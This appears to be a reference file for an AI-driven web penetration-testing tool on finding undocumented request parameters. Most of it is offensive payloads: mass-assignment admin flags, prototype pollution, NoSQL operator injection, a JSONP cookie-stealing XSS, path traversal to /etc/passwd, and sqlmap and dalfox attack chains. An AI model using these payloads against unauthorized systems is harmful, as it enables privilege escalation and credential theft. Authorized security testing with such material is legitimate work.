---
name: hidden-param-discovery
description: "Discover undocumented parameters with arjun, Burp Param Miner, framework-aware wordlists (Rails mass assignment, Spring debug, Django fields), JS extraction, and API version differencing — the prerequisite step before SQLi/XSS/SSRF/IDOR testing. Use when an endpoint looks too thin to be interesting, or before declaring a parameter surface exhausted."
---

# Hidden Parameter Discovery — Full Reference

## Crown Jewel Targets

- **Registration/profile update endpoints** -- mass assignment via hidden `role`, `isAdmin`, `plan`, `verified` params. ~35% of privilege escalation bugs come from undocumented params
- **Search/filter endpoints** -- hidden `debug`, `verbose`, `explain`, `trace` params that dump SQL queries, stack traces, or DB credentials
- **API endpoints with framework auto-binding** -- Rails, Django, Spring bind ANY matching param name. Add `is_staff=True` to Django profile update = instant admin
- **JSONP/callback endpoints** -- hidden `callback` or `jsonp` param enables reflected XSS via JSONP response wrapping
- **URL-accepting params** (hidden `url`, `link`, `redirect`, `webhook`, `fetch`, `src`) -- ~35% of SSRF bugs discovered through undocumented URL params
- **GraphQL with disabled introspection** -- field suggestion abuse ("Did you mean 'role'?") reveals hidden fields. Batch single-char queries to enumerate
- **Old API versions** -- `/api/v1/` may accept `admin=true` that `/api/v3/` blocks. Version header (`X-API-Version: 1`) also works

## Attack Surface Signals

- **URL patterns**: any API endpoint, search pages, registration forms, profile update pages, import/export endpoints
- **Response diffing signals**: different response length, status code, or headers when adding unknown param = param is processed by backend
- **JS indicators**: param names in JS bundles (grep `fetch`, `axios`, form field names), URL construction patterns
- **Framework signals**: Rails (`authenticity_token`, `utf8`), Django (`csrfmiddlewaretoken`, `format=api`), Spring (`debug=true`, `trace=true`)

> On-demand knowledge file for `/find-params` command. Read specific sections as needed.

---

## Why Hidden Params Are Critical

Real-world stats from bug bounty:
- **~40% of SQLi bugs** found via hidden params (not visible in UI)
- **~35% of SSRF** discovered through undocumented URL-accepting params
- **Most mass assignment bugs** require guessing field names not in frontend
- Debug/test params bypass security controls (WAF, auth, rate limiting)

### How Params Get "Hidden"
1. **Removed from frontend, still processed by backend** — old features, A/B tests
2. **Framework auto-binding** — Rails, Django, Spring bind ANY matching param
3. **Internal/admin params** — debug, trace, verbose, admin flags
4. **API versioning** — v1 accepts params v2 doesn't document
5. **Different HTTP methods** — GET shows params, POST/PUT accept more
6. **Conditional params** — only processed when another param present

---

## Tool Reference

### ffuf (PRIMARY — shipped)

ffuf does parameter mining with the wordlist the image already carries, so this is
the path that works out of the box:

```bash
# Baseline the miss-response first, then filter on its shape (-fs/-fw/-fc),
# or every line of output is noise.
ffuf -u 'https://TARGET/page?FUZZ=1' -w /usr/share/wordlists/burp-parameter-names.txt -mc all -fs <baseline-size>

# With auth
ffuf -u 'https://TARGET/page?FUZZ=1' -w /usr/share/wordlists/burp-parameter-names.txt -H 'Cookie: session=xxx' -mc all -fs <baseline-size>

# POST body params
ffuf -u https://TARGET/page -X POST -d 'FUZZ=1' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/burp-parameter-names.txt -mc all -fs <baseline-size>
```

### arjun (NOT installed — only if you add it)

arjun is more accurate than ffuf here because it diffs responses and chunks
candidates, but it does **not** ship in this image. Check it is on PATH before
planning around it; `pip install arjun` if the engagement justifies the step.

```bash
# Docs: https://github.com/s0md3v/Arjun

# Basic usage
arjun -u URL -m GET                    # GET params
arjun -u URL -m POST                   # POST form params  
arjun -u URL -m JSON                   # JSON body params
arjun -u URL -m XML                    # XML body params

# With auth
arjun -u URL -m GET -H "Cookie: session=xxx" -H "Authorization: Bearer xxx"

# Custom wordlist
arjun -u URL -m GET -w custom-params.txt

# Multiple URLs
arjun --urls urls.txt -m GET -oJ output.json

# Rate limiting (for WAF targets)
arjun -u URL -m GET -t 5 -d 1         # 5 threads, 1s delay

# Chunked discovery (more accurate, slower)
arjun -u URL -m GET --chunks 5        # Send 5 params per request
```

**How arjun works:**
1. Sends baseline request → captures response
2. Sends params in chunks → compares response (length, status, headers)
3. If response differs → param is accepted by backend
4. Narrows down exact param via binary search

### Burp Param Miner (extension)
- Install: BApp Store → Param Miner
- Right-click request → Extensions → Param Miner → Guess params/headers
- Works with authenticated sessions automatically
- Slower but more thorough than arjun
- Detects: params, headers, cookies

### x8 (alternative — Rust, faster)
```bash
# If installed
x8 -u URL -w params.txt               # GET
x8 -u URL -w params.txt -X POST       # POST
x8 -u URL -w params.txt --json        # JSON
```

### GAP (Burp extension — passive)
- Passively collects params from proxy history
- Builds wordlist from observed params across all requests
- No active scanning needed
- Good for building target-specific wordlists

---

## Param Wordlists (ranked by quality)

| Wordlist | Size | Best For |
|---|---|---|
| arjun built-in | ~25K | General web apps |
| `wordlists/Bug-Bounty-Wordlists/params.txt` | varies | Bug bounty specific |
| SecLists `discovery/web-content/burp-parameter-names.txt` | ~6K | Common params |
| Assetnote `parameters-top-1m.txt` | 1M | Exhaustive (slow) |
| Target-specific (from JS/Wayback) | varies | **Highest ROI** |

**RULE**: Always merge target-specific params (from JS analysis, Wayback, prior facts/assets via list_facts/list_assets) with generic wordlist.

---

## Framework-Specific Deep Dive

### Ruby on Rails
```
# Mass assignment (strong params bypass)
# If controller uses `params.permit(:name, :email)` but model has more fields:
user[role]=admin
user[is_admin]=1
user[verified]=true
user[balance]=99999

# Debug params
debug=1
pp=1                    # Pretty print (Rails debug)
explain=1               # SQL EXPLAIN output
format=json             # Force JSON response
_method=DELETE          # Method override

# CSRF bypass
authenticity_token=     # Empty token
utf8=✓
```

### Spring Boot / Java
```
# Actuator endpoints (if exposed)
management.endpoints.web.exposure.include=*
spring.profiles.active=dev

# Debug
debug=true
trace=true
server.error.include-stacktrace=always
server.error.include-message=always

# Mass assignment
class.module.classLoader.* (CVE-2022-22965 Spring4Shell pattern)

# JNDI injection params
spring.datasource.url=
spring.cloud.config.uri=
```

### Django / Python
```
# Debug
debug=True
DJANGO_SETTINGS_MODULE=project.settings.dev

# REST framework
format=json|xml|yaml|api    # DRF format suffix
page=1&page_size=10000      # Pagination abuse
ordering=-created_at         # Sort injection
fields=id,email,password_hash  # Field selection
expand=user,profile          # Nested serializer expansion
include=all                  # Include related objects

# Mass assignment
is_staff=True
is_superuser=True
is_active=True
groups=[1]                   # Admin group
```

### Express.js / Node.js
```
# Prototype pollution via params
__proto__[isAdmin]=true
constructor[prototype][isAdmin]=true

# JSONP callback
callback=alert(1)//
jsonp=alert(1)//

# MongoDB operator injection (if using query params directly)
username[$ne]=x
password[$gt]=
role[$regex]=admin

# Debug
NODE_ENV=development
DEBUG=*
verbose=true
```

### PHP / Laravel
```
# Debug
XDEBUG_SESSION_START=phpstorm
debug=1
APP_DEBUG=true

# Mass assignment (Laravel fillable bypass)
is_admin=1
role=admin
email_verified_at=2026-01-01

# Type juggling
param=0           # == "" in loose comparison
param[]=           # Array to bypass string checks
param=true        # Boolean cast

# File inclusion
_token=            # CSRF token empty
_method=PUT        # Method spoofing
```

### ASP.NET
```
# ViewState manipulation
__VIEWSTATE=
__VIEWSTATEGENERATOR=
__EVENTVALIDATION=

# Debug
customErrors=Off
debug=true
trace=true

# Path traversal via params
ReturnUrl=/admin
aspxerrorpath=/admin
pathInfo=../../web.config

# Mass assignment (model binding)
IsAdmin=true
Role=Administrator
```

---

## Advanced Techniques

### 1. Response Diffing for Param Detection
```python
# Manual approach when tools fail
import requests

base = requests.get("https://target.com/api/endpoint")
params_to_test = ["debug", "admin", "verbose", "test", "format", "callback"]

for param in params_to_test:
    r = requests.get(f"https://target.com/api/endpoint?{param}=true")
    if len(r.text) != len(base.text) or r.status_code != base.status_code:
        print(f"[!] Param accepted: {param} (len diff: {len(r.text) - len(base.text)}, status: {r.status_code})")
```

### 2. HTTP Method Param Pollution
```
# Same endpoint, different methods accept different params
GET  /api/users?role=admin     → 403
POST /api/users  role=admin    → 200 (different handler!)
PUT  /api/users  {"role":"admin"} → 200

# Content-Type switch
POST application/x-www-form-urlencoded → limited params
POST application/json → accepts nested objects
POST application/xml → XXE possible
```

### 3. Param Name Fuzzing Patterns
```
# Case variations
userId, userid, UserId, USERID, user_id, user-id

# Prefix/suffix
x_admin, is_admin, admin_flag, has_admin
user.role, user[role], user->role

# Encoded
%64%65%62%75%67 (debug URL-encoded)
debug%00 (null byte)
debug%0a (newline)
```

### 4. GraphQL Hidden Fields
```graphql
# Introspection disabled? Use field suggestion:
{ user { __typename isAdmin } }  # Error reveals valid fields
{ user { rolee } }               # "Did you mean 'role'?"

# Batch field discovery
{ user { a b c d e f g h i j k l m n o p q r s t u v w x y z } }
```

### 5. API Versioning Param Differences
```
# v1 may accept params v2 blocks
/api/v1/users?admin=true    → works (old, unpatched)
/api/v2/users?admin=true    → blocked (new, secured)

# Version header
X-API-Version: 1
X-API-Version: 2024-01-01
Accept: application/vnd.api.v1+json
```

---

## Integration with Attack Pipeline

### Pre-SQLi
```bash
# Discover params → immediately test each for SQLi
arjun -u "https://target.com/search" -m GET -oJ /tmp/params.json
# For each discovered param:
sqlmap -u "https://target.com/search?DISCOVERED_PARAM=test" --batch --level 3
```

### Pre-XSS
```bash
# Hidden reflected params = highest XSS probability
# Arjun finds param → check if reflected
curl -s "https://target.com/page?DISCOVERED_PARAM=xss_canary_12345" | grep -c "xss_canary_12345"
# If reflected → dalfox
dalfox url "https://target.com/page?DISCOVERED_PARAM=test" --silence --only-poc
```

### Pre-SSRF
```bash
# URL-accepting params → interactsh
# Any param with: url, link, redirect, callback, webhook, fetch, load, src, href, uri
curl "https://target.com/api?DISCOVERED_URL_PARAM=https://PAYLOAD_HOST"
```

### Pre-IDOR
```bash
# ID-like params → test with another user's ID
# Any param with: id, uid, user_id, account_id, ref, order_id, doc_id
# Burp Autorize: replay request with low-priv session
```

---

## Real-World Examples

### Example 1: Hidden `debug` param → Full Stack Trace → DB Credentials
```
GET /api/search?q=test           → 200 {"results": [...]}
GET /api/search?q=test&debug=1   → 200 {"results": [...], "sql": "SELECT * FROM...", "db_host": "10.0.1.5", "connection_string": "postgres://admin:P@ss123@10.0.1.5/prod"}
```
Impact: P1 — database credential exposure

### Example 2: Hidden `role` param → Privilege Escalation
```
POST /api/register {"username": "test", "email": "test@test.com", "password": "xxx"}
→ Creates normal user

POST /api/register {"username": "test2", "email": "test2@test.com", "password": "xxx", "role": "admin"}
→ Creates admin user (mass assignment)
```
Impact: P1 — privilege escalation to admin

### Example 3: Hidden `callback` param → Reflected XSS
```
GET /api/data                           → 200 {"data": "..."}
GET /api/data?callback=alert(document.cookie)// → 200 alert(document.cookie)//{"data": "..."}
```
Impact: P2 — XSS via JSONP callback

### Example 4: Hidden `file` param → LFI → Source Code
```
GET /page                               → 200 Normal page
GET /page?file=../../etc/passwd         → 200 root:x:0:0:...
GET /page?file=../../app/config/database.yml → 200 (DB creds)
```
Impact: P1 — Local File Inclusion → source code / credentials

## Operator Notes (Battle-Tested)

1. **Discover params on EVERY endpoint before injection testing** -- this is a HARD GATE: injection testing is blocked until param discovery completes. The gate is on the *step*, not on one tool. Default to the shipped `ffuf` + `/usr/share/wordlists/burp-parameter-names.txt`, baselining the miss-response and filtering on its shape. If you installed arjun, it is the more accurate option: `arjun -u URL -m GET` then `-m POST` then `-m JSON`, with auth `-H "Cookie: session=xxx"`, rate-limited targets `-t 5 -d 1`.
2. **Always merge target-specific params with generic wordlists** -- extract param names from JS bundles, Wayback URLs, prior asset records (list_assets), and HTML forms. Merge into arjun's wordlist: `arjun -u URL -m GET -w custom-params.txt`. Target-specific params have the highest hit rate.
3. **Test HTTP method param pollution** -- same endpoint with GET, POST, PUT, PATCH may accept different params. Also test Content-Type switching: `application/x-www-form-urlencoded` vs `application/json` vs `application/xml`. JSON bodies often accept nested objects that form-encoded does not.
4. **GraphQL field suggestion is param discovery for GraphQL** -- send invalid field names like `{ user { rolee } }`. Error message "Did you mean 'role'?" reveals valid field names even when introspection is disabled. Batch single-character queries to enumerate the full schema.
5. **Response diffing for param detection when tools fail** -- send baseline request, then add one param at a time. Compare response length, status code, headers, and timing. Even a 1-byte length difference = param is processed by backend. Automate with simple Python script.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Discovered params to test for injection | `api-security-testing` |
| Mass assignment params for privilege escalation | `access-control-testing` |
| Hidden params for business logic abuse | `business-logic-testing` |
| WAF blocks known param names | `waf-bypass` → `references/waf-generic-evasion.md` |
| Hidden params reflected in DOM | `xss-testing` |
| GraphQL field enumeration | `graphql-testing` |
